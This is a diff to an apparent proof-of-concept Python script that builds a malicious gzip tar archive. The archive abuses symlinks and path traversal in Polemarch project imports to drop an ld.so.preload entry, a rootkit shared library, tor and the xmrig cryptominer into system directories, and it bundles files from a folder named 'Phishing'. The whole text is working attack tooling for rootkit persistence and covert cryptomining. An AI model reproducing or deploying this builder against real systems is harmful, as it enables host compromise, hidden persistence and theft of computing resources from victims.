@@ -1,6 +1,10 @@
 import tarfile
 import os
 
+# Project with polemarch project
+# ------------------------------
+POLEMARCH_PROJECT = "../Phishing/Energy_Plus_Test"
+
 # Relatives directories symlinked
 # -------------------------------
 ETC_LOCAL = "aaaa"
@@ -34,11 +38,11 @@ POC_MAPPINGS = {
     "ld.so.preload": f'{ETC_LOCAL}/ld.so.preload',
 
     ## -> usr/local/lib
-    "rootkit.so": f'{LIB_LOCAL}/rootkit.so',
+    "../rootkit/rootkit.so": f'{LIB_LOCAL}/rootkit.so',
 
     ## -> usr/bin
-    "tor": f'{BIN_LOCAL}/tor',
-    "xmrig": f'{BIN_LOCAL}/xmrig',
+    "../cryptominer/tor": f'{BIN_LOCAL}/tor',
+    "../cryptominer/xmrig": f'{BIN_LOCAL}/xmrig',
 
     ## -> opt/polemarch/bin
     "polemarchctl": f'{BIN_POLEMARCH}/polemarchctl'
@@ -72,17 +76,23 @@ def main():
         pass
 
     # Create maliciuos tar using path traversal filter attack
-    tar = tarfile.open(f'./tar/{TAR_NAME}', "w:gz")
+    with tarfile.open(f'./tar/{TAR_NAME}', "w:gz") as tar:
+        for file in POC_MAPPINGS:
+            tar.add(file, filter=change_name)
+        
+        # Copy all files from polemarch folder, removing the dirname
+        print(f'[*] Copying files from {POLEMARCH_PROJECT} into tar')
+        for file in os.listdir(POLEMARCH_PROJECT):
+            print("    [*] Copying file", file)
 
-    for file in POC_MAPPINGS:
-        tar.add(file, filter=change_name)
+            # Remove the dirname from the file
+            tar.add(f'{POLEMARCH_PROJECT}/{file}', arcname=file)
 
     # Remove symlinks
     for directory in DIRECTORIES:
         print(f'[*] Removing symlink {directory}')
         os.remove(directory)
     
-    tar.close()
 
 if __name__ == "__main__":
     main()
